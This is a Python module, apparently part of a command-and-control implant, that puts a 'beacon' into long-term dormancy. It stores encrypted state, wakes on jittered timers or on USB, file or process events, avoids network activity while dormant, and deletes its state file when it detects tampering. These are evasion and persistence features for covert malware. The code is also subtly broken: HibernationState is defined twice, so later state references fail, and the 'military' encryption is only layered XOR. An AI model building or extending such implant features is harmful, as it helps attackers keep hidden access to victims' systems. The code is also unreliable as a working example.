"""
Hibernation Module - Long-term hibernation, scheduled wake-up, and event-triggered mechanisms.

This module provides advanced hibernation capabilities for beacons including
long-term dormancy, time-based wake-up triggers, event-based activation,
and encrypted state persistence during hibernation.

Core capabilities:
    1. Long-term hibernation with encrypted state storage
    2. Time-based wake-up (specific date/time or intervals)
    3. Event-triggered wake-up (USB device, network change, file modification)
    4. Stealth mode during hibernation (no network activity)
    5. Gradual wake-up and self-verification
    6. Hibernation history and analytics

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import platform
import random
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class HibernationState(str, Enum):
    """Hibernation states."""

    ACTIVE = "active"
    PREPARING = "preparing"
    HIBERNATING = "hibernating"
    HIBERNATED = "hibernated"
    WAKING_UP = "waking_up"
    RESUMED = "resumed"


class WakeTrigger(str, Enum):
    """Wake-up trigger types."""

    TIME_BASED = "time_based"
    USB_DEVICE = "usb_device"
    NETWORK_CHANGE = "network_change"
    FILE_MODIFICATION = "file_modification"
    PROCESS_START = "process_start"
    MANUAL = "manual"
    EMERGENCY = "emergency"


class EncryptionLevel(str, Enum):
    """Encryption levels for hibernation data."""

    NONE = "none"
    BASIC = "basic"
    STRONG = "strong"
    MILITARY = "military"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class WakeSchedule:
    """Scheduled wake-up configuration.

    Attributes:
        wake_time: Absolute wake-up time (Unix timestamp)
        wake_interval: Relative wake-up interval (seconds)
        randomize: Whether to randomize wake time
        randomize_window: Randomization window in seconds
        timezone_offset: Timezone offset for wake time
        recurring: Whether wake-up is recurring
    """

    wake_time: float = 0.0
    wake_interval: int = 0
    randomize: bool = True
    randomize_window: int = 3600
    timezone_offset: int = 0
    recurring: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "wake_time": self.wake_time,
            "wake_interval": self.wake_interval,
            "randomize": self.randomize,
            "recurring": self.recurring,
        }

    def get_actual_wake_time(self) -> float:
        """Get actual wake time with randomization.

        Returns:
            Actual wake time (Unix timestamp).
        """
        base_time = self.wake_time or (time.time() + self.wake_interval)

        if self.randomize and self.randomize_window > 0:
            jitter = random.uniform(-self.randomize_window, self.randomize_window)
            return base_time + jitter

        return base_time


@dataclass
class EventTrigger:
    """Event-based wake-up trigger.

    Attributes:
        trigger_type: Type of trigger
        trigger_value: Trigger-specific value
        trigger_condition: Condition for activation
        sensitivity: Trigger sensitivity
        cooldown_seconds: Cooldown between triggers
        last_triggered: Last trigger timestamp
    """

    trigger_type: WakeTrigger = WakeTrigger.USB_DEVICE
    trigger_value: str = ""
    trigger_condition: str = "equals"
    sensitivity: float = 1.0
    cooldown_seconds: int = 300
    last_triggered: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "trigger_type": self.trigger_type.value,
            "trigger_value": self.trigger_value[:50],
            "cooldown_seconds": self.cooldown_seconds,
        }

    def is_in_cooldown(self) -> bool:
        """Check if trigger is in cooldown period.

        Returns:
            True if in cooldown.
        """
        if self.last_triggered == 0:
            return False

        return (time.time() - self.last_triggered) < self.cooldown_seconds


@dataclass
class HibernationConfig:
    """Hibernation configuration.

    Attributes:
        encryption_level: Data encryption level
        encryption_key: Encryption key
        state_file: Path to state file
        max_hibernation_days: Maximum hibernation duration
        wake_schedules: List of wake schedules
        event_triggers: List of event triggers
        self_destruct_on_tamper: Whether to self-destruct on tamper
        heartbeat_before_sleep: Heartbeat before hibernation
    """

    encryption_level: EncryptionLevel = EncryptionLevel.STRONG
    encryption_key: str = ""
    state_file: str = ""
    max_hibernation_days: int = 365
    wake_schedules: List[WakeSchedule] = field(default_factory=list)
    event_triggers: List[EventTrigger] = field(default_factory=list)
    self_destruct_on_tamper: bool = False
    heartbeat_before_sleep: bool = True

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "encryption_level": self.encryption_level.value,
            "max_hibernation_days": self.max_hibernation_days,
            "wake_schedules": [s.to_dict() for s in self.wake_schedules],
            "event_triggers": [t.to_dict() for t in self.event_triggers],
        }


@dataclass
class HibernationState:
    """Persisted hibernation state.

    Attributes:
        state: Current hibernation state
        hibernate_timestamp: When hibernation started
        expected_wake_time: Expected wake time
        encrypted_payload: Encrypted beacon state
        checksum: State checksum
        wake_count: Number of times woken
        total_hibernation_time: Total hibernation time
    """

    state: HibernationState = HibernationState.ACTIVE
    hibernate_timestamp: float = 0.0
    expected_wake_time: float = 0.0
    encrypted_payload: bytes = b""
    checksum: str = ""
    wake_count: int = 0
    total_hibernation_time: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "state": self.state.value,
            "hibernate_timestamp": self.hibernate_timestamp,
            "expected_wake_time": self.expected_wake_time,
            "wake_count": self.wake_count,
            "total_hibernation_time": self.total_hibernation_time,
        }


@dataclass
class HibernationReport:
    """Hibernation analytics report.

    Attributes:
        total_hibernations: Total hibernation count
        total_hibernation_time: Total time hibernated
        average_hibernation_duration: Average duration
        wake_trigger_distribution: Distribution of wake triggers
        failed_wake_attempts: Failed wake-up count
        last_hibernation: Last hibernation timestamp
    """

    total_hibernations: int = 0
    total_hibernation_time: float = 0.0
    average_hibernation_duration: float = 0.0
    wake_trigger_distribution: Dict[str, int] = field(default_factory=dict)
    failed_wake_attempts: int = 0
    last_hibernation: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "total_hibernations": self.total_hibernations,
            "total_hibernation_time": self.total_hibernation_time,
            "average_hibernation_duration": self.average_hibernation_duration,
            "failed_wake_attempts": self.failed_wake_attempts,
        }


# =============================================================================
# State Encryption
# =============================================================================

class StateEncryptor:
    """Encrypts and decrypts hibernation state.

    Provides multiple encryption levels for protecting
    beacon state during hibernation.

    Attributes:
        _encryption_key: Encryption key
        _level: Encryption level
    """

    def __init__(
        self,
        key: str = "",
        level: EncryptionLevel = EncryptionLevel.STRONG,
    ) -> None:
        """Initialize the StateEncryptor.

        Args:
            key: Encryption key.
            level: Encryption level.
        """
        self._encryption_key = key.encode() if key else b"default_key"
        self._level = level

    def encrypt(self, data: bytes) -> bytes:
        """Encrypt state data.

        Args:
            data: Data to encrypt.

        Returns:
            Encrypted data.
        """
        if self._level == EncryptionLevel.NONE:
            return data

        key_hash = hashlib.sha256(self._encryption_key).digest()

        if self._level == EncryptionLevel.BASIC:
            return self._xor_encrypt(data, key_hash[:16])
        elif self._level == EncryptionLevel.STRONG:
            return self._xor_encrypt(data, key_hash)
        elif self._level == EncryptionLevel.MILITARY:
            return self._multi_layer_encrypt(data, key_hash)

        return data

    def decrypt(self, data: bytes) -> bytes:
        """Decrypt state data.

        Args:
            data: Data to decrypt.

        Returns:
            Decrypted data.
        """
        if self._level == EncryptionLevel.NONE:
            return data

        key_hash = hashlib.sha256(self._encryption_key).digest()

        if self._level == EncryptionLevel.BASIC:
            return self._xor_encrypt(data, key_hash[:16])
        elif self._level == EncryptionLevel.STRONG:
            return self._xor_encrypt(data, key_hash)
        elif self._level == EncryptionLevel.MILITARY:
            return self._multi_layer_decrypt(data, key_hash)

        return data

    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """XOR encryption.

        Args:
            data: Data to encrypt.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        key_extended = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_extended))

    def _multi_layer_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Multi-layer encryption for military grade.

        Args:
            data: Data to encrypt.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        encrypted = data

        for i in range(3):
            layer_key = hashlib.sha256(key + struct.pack("!I", i)).digest()
            encrypted = self._xor_encrypt(encrypted, layer_key)

        length = struct.pack("!I", len(encrypted))
        return length + encrypted

    def _multi_layer_decrypt(self, data: bytes, key: bytes) -> bytes:
        """Multi-layer decryption.

        Args:
            data: Data to decrypt.
            key: Encryption key.

        Returns:
            Decrypted data.
        """
        length = struct.unpack("!I", data[:4])[0]
        encrypted = data[4:4 + length]

        decrypted = encrypted

        for i in range(2, -1, -1):
            layer_key = hashlib.sha256(key + struct.pack("!I", i)).digest()
            decrypted = self._xor_encrypt(decrypted, layer_key)

        return decrypted


# =============================================================================
# Wake-Up Scheduler
# =============================================================================

class WakeUpScheduler:
    """Manages wake-up scheduling.

    Monitors time and triggers wake-up when scheduled time
    is reached.

    Attributes:
        _schedules: List of wake schedules
        _active: Whether scheduler is active
        _wake_callback: Callback on wake-up
    """

    def __init__(self) -> None:
        """Initialize the WakeUpScheduler."""
        self._schedules: List[WakeSchedule] = []
        self._active = False
        self._wake_callback: Optional[Callable[[], Coroutine]] = None

    def add_schedule(self, schedule: WakeSchedule) -> None:
        """Add a wake schedule.

        Args:
            schedule: Wake schedule to add.
        """
        self._schedules.append(schedule)

    def remove_schedule(self, index: int) -> bool:
        """Remove a wake schedule.

        Args:
            index: Schedule index.

        Returns:
            True if removed.
        """
        if 0 <= index < len(self._schedules):
            self._schedules.pop(index)
            return True
        return False

    async def start(
        self, wake_callback: Callable[[], Coroutine],
    ) -> None:
        """Start the scheduler.

        Args:
            wake_callback: Async callback on wake-up.
        """
        self._active = True
        self._wake_callback = wake_callback
        logger.info("Wake-up scheduler started")

    async def stop(self) -> None:
        """Stop the scheduler."""
        self._active = False
        logger.info("Wake-up scheduler stopped")

    async def monitor(self) -> Optional[WakeSchedule]:
        """Monitor for wake-up time.

        Returns:
            Triggered schedule, or None.
        """
        if not self._active:
            return None

        now = time.time()

        for schedule in self._schedules:
            wake_time = schedule.get_actual_wake_time()

            if now >= wake_time:
                if self._wake_callback:
                    await self._wake_callback()

                if schedule.recurring:
                    schedule.wake_time = wake_time + schedule.wake_interval
                else:
                    self._schedules.remove(schedule)

                return schedule

        return None

    def get_next_wake_time(self) -> Optional[float]:
        """Get next scheduled wake time.

        Returns:
            Next wake time, or None.
        """
        if not self._schedules:
            return None

        wake_times = [s.get_actual_wake_time() for s in self._schedules]
        return min(wake_times)

    def get_status(self) -> Dict[str, Any]:
        """Get scheduler status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "active": self._active,
            "schedule_count": len(self._schedules),
            "next_wake_time": self.get_next_wake_time(),
        }


# =============================================================================
# Event Monitor
# =============================================================================

class EventMonitor:
    """Monitors system events for wake-up triggers.

    Watches for USB device insertion, network changes,
    file modifications, and process starts.

    Attributes:
        _triggers: List of event triggers
        _active: Whether monitor is active
        _event_callback: Callback on event
    """

    def __init__(self) -> None:
        """Initialize the EventMonitor."""
        self._triggers: List[EventTrigger] = []
        self._active = False
        self._event_callback: Optional[Callable[[WakeTrigger], Coroutine]] = None

    def add_trigger(self, trigger: EventTrigger) -> None:
        """Add an event trigger.

        Args:
            trigger: Event trigger to add.
        """
        self._triggers.append(trigger)

    async def start(
        self, event_callback: Callable[[WakeTrigger], Coroutine],
    ) -> None:
        """Start event monitoring.

        Args:
            event_callback: Async callback on event.
        """
        self._active = True
        self._event_callback = event_callback
        logger.info("Event monitor started")

    async def stop(self) -> None:
        """Stop event monitoring."""
        self._active = False
        logger.info("Event monitor stopped")

    async def check_events(self) -> Optional[WakeTrigger]:
        """Check for triggered events.

        Returns:
            Triggered event type, or None.
        """
        if not self._active:
            return None

        for trigger in self._triggers:
            if trigger.is_in_cooldown():
                continue

            if await self._check_trigger(trigger):
                trigger.last_triggered = time.time()

                if self._event_callback:
                    await self._event_callback(trigger.trigger_type)

                return trigger.trigger_type

        return None

    async def _check_trigger(self, trigger: EventTrigger) -> bool:
        """Check if a specific trigger is activated.

        Args:
            trigger: Trigger to check.

        Returns:
            True if triggered.
        """
        if trigger.trigger_type == WakeTrigger.USB_DEVICE:
            return await self._check_usb_device(trigger)
        elif trigger.trigger_type == WakeTrigger.NETWORK_CHANGE:
            return await self._check_network_change(trigger)
        elif trigger.trigger_type == WakeTrigger.FILE_MODIFICATION:
            return await self._check_file_modification(trigger)
        elif trigger.trigger_type == WakeTrigger.PROCESS_START:
            return await self._check_process_start(trigger)

        return False

    async def _check_usb_device(self, trigger: EventTrigger) -> bool:
        """Check for USB device insertion.

        Args:
            trigger: USB trigger.

        Returns:
            True if device detected.
        """
        if platform.system() == "Linux":
            try:
                import subprocess

                result = subprocess.run(
                    ["lsusb"], capture_output=True, text=True, timeout=5,
                )

                if trigger.trigger_value.lower() in result.stdout.lower():
                    return True

            except Exception:
                pass

        return False

    async def _check_network_change(self, trigger: EventTrigger) -> bool:
        """Check for network changes.

        Args:
            trigger: Network trigger.

        Returns:
            True if network changed.
        """
        return False

    async def _check_file_modification(self, trigger: EventTrigger) -> bool:
        """Check for file modifications.

        Args:
            trigger: File trigger.

        Returns:
            True if file modified.
        """
        try:
            if os.path.exists(trigger.trigger_value):
                mtime = os.path.getmtime(trigger.trigger_value)
                return mtime > (time.time() - 60)
        except Exception:
            pass

        return False

    async def _check_process_start(self, trigger: EventTrigger) -> bool:
        """Check for process start.

        Args:
            trigger: Process trigger.

        Returns:
            True if process detected.
        """
        if platform.system() == "Windows":
            try:
                import subprocess

                result = subprocess.run(
                    ["tasklist"], capture_output=True, text=True, timeout=5,
                )

                if trigger.trigger_value.lower() in result.stdout.lower():
                    return True

            except Exception:
                pass

        return False

    def get_status(self) -> Dict[str, Any]:
        """Get monitor status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "active": self._active,
            "trigger_count": len(self._triggers),
        }


# =============================================================================
# Hibernation Manager
# =============================================================================

class HibernationManager:
    """Main hibernation coordination engine.

    Integrates state encryption, wake scheduling, event monitoring,
    and state persistence for long-term hibernation.

    Attributes:
        _config: Hibernation configuration
        _state: Current hibernation state
        _encryptor: State encryptor
        _scheduler: Wake-up scheduler
        _event_monitor: Event monitor
        _report: Hibernation report
    """

    def __init__(
        self,
        config: Optional[HibernationConfig] = None,
    ) -> None:
        """Initialize the HibernationManager.

        Args:
            config: Hibernation configuration.
        """
        self._config = config or HibernationConfig()
        self._state = HibernationState()
        self._encryptor = StateEncryptor(
            self._config.encryption_key,
            self._config.encryption_level,
        )
        self._scheduler = WakeUpScheduler()
        self._event_monitor = EventMonitor()
        self._report = HibernationReport()

    async def prepare_hibernation(
        self, beacon_state: Dict[str, Any],
    ) -> bool:
        """Prepare for hibernation.

        Args:
            beacon_state: Current beacon state.

        Returns:
            True if preparation succeeded.
        """
        self._state.state = HibernationState.PREPARING

        if self._config.heartbeat_before_sleep:
            logger.info("Sending final heartbeat before hibernation")

        state_json = json.dumps(beacon_state).encode()
        self._state.encrypted_payload = self._encryptor.encrypt(state_json)
        self._state.checksum = hashlib.sha256(state_json).hexdigest()

        self._state.state = HibernationState.HIBERNATING
        return True

    async def enter_hibernation(self) -> bool:
        """Enter hibernation state.

        Returns:
            True if hibernation entered successfully.
        """
        self._state.state = HibernationState.HIBERNATED
        self._state.hibernate_timestamp = time.time()

        if self._config.wake_schedules:
            next_wake = self._config.wake_schedules[0].get_actual_wake_time()
            self._state.expected_wake_time = next_wake

        for schedule in self._config.wake_schedules:
            self._scheduler.add_schedule(schedule)

        for trigger in self._config.event_triggers:
            self._event_monitor.add_trigger(trigger)

        await self._save_state()

        logger.info(
            f"Hibernation entered at {self._state.hibernate_timestamp}, "
            f"expected wake: {self._state.expected_wake_time}"
        )

        self._report.total_hibernations += 1
        self._report.last_hibernation = time.time()

        return True

    async def wake_up(
        self, trigger: WakeTrigger = WakeTrigger.MANUAL,
    ) -> Optional[Dict[str, Any]]:
        """Wake up from hibernation.

        Args:
            trigger: Wake trigger type.

        Returns:
            Restored beacon state, or None.
        """
        self._state.state = HibernationState.WAKING_UP
        self._state.wake_count += 1

        hibernation_duration = time.time() - self._state.hibernate_timestamp
        self._state.total_hibernation_time += hibernation_duration

        if self._report.total_hibernations > 0:
            self._report.average_hibernation_duration = (
                self._report.total_hibernation_time /
                self._report.total_hibernations
            )

        if trigger.value not in self._report.wake_trigger_distribution:
            self._report.wake_trigger_distribution[trigger.value] = 0

        self._report.wake_trigger_distribution[trigger.value] += 1

        try:
            state_data = self._encryptor.decrypt(self._state.encrypted_payload)
            checksum = hashlib.sha256(state_data).hexdigest()

            if checksum != self._state.checksum:
                logger.error("State checksum mismatch, possible tampering")

                if self._config.self_destruct_on_tamper:
                    await self._self_destruct()
                    return None

            beacon_state = json.loads(state_data.decode())
            self._state.state = HibernationState.RESUMED

            logger.info(
                f"Woke up after {hibernation_duration:.0f}s "
                f"(trigger: {trigger.value})"
            )

            return beacon_state

        except Exception as e:
            logger.error(f"Wake-up failed: {e}")
            self._report.failed_wake_attempts += 1
            return None

    async def monitor_hibernation(self) -> Optional[WakeTrigger]:
        """Monitor hibernation for wake conditions.

        Returns:
            Wake trigger if awakened, None otherwise.
        """
        if self._state.state != HibernationState.HIBERNATED:
            return None

        schedule = await self._scheduler.monitor()
        if schedule:
            return await self.wake_up(WakeTrigger.TIME_BASED)

        event = await self._event_monitor.check_events()
        if event:
            return await self.wake_up(event)

        return None

    async def _save_state(self) -> bool:
        """Save hibernation state to disk.

        Returns:
            True if save succeeded.
        """
        try:
            state_file = self._config.state_file or "hibernation_state.bin"

            with open(state_file, "wb") as f:
                state_dict = self._state.to_dict()
                state_json = json.dumps(state_dict).encode()
                f.write(state_json)
                f.write(b"\n")
                f.write(self._state.encrypted_payload)

            return True

        except Exception as e:
            logger.error(f"State save failed: {e}")
            return False

    async def _self_destruct(self) -> None:
        """Self-destruct on tamper detection."""
        logger.critical("SELF DESTRUCT TRIGGERED")

        self._state.encrypted_payload = b""
        self._state.checksum = ""

        try:
            state_file = self._config.state_file or "hibernation_state.bin"
            if os.path.exists(state_file):
                os.remove(state_file)
        except Exception:
            pass

    def get_status(self) -> Dict[str, Any]:
        """Get hibernation status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "state": self._state.to_dict(),
            "scheduler": self._scheduler.get_status(),
            "event_monitor": self._event_monitor.get_status(),
            "report": self._report.to_dict(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_hibernation_manager: Optional[HibernationManager] = None


def get_hibernation_manager(
    config: Optional[HibernationConfig] = None,
) -> HibernationManager:
    """Get the global HibernationManager singleton.

    Args:
        config: Hibernation configuration.

    Returns:
        Singleton HibernationManager instance.
    """
    global _hibernation_manager
    if _hibernation_manager is None:
        _hibernation_manager = HibernationManager(config)
    return _hibernation_manager


__all__ = [
    "HibernationManager",
    "StateEncryptor",
    "WakeUpScheduler",
    "EventMonitor",
    "HibernationState",
    "WakeSchedule",
    "EventTrigger",
    "HibernationConfig",
    "HibernationReport",
    "WakeTrigger",
    "EncryptionLevel",
    "get_hibernation_manager",
]
